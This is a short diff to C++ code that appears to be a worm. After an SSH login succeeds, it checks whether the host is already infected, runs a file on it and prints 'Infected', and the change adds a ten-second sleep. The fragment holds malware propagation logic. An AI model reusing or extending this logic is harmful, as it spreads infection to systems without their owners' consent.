@@ -295,7 +295,9 @@ int main() {
 				printf("\nSucceded to get into the host");
             
 				if (!isInfected(my_ssh_session)) {
+					
 						res = executeFile(my_ssh_session);
+						sleep(10);
 						if(res){
 							std::cout<<"\n Infected. " << *host << ". I can rest now ;)\n";
 							
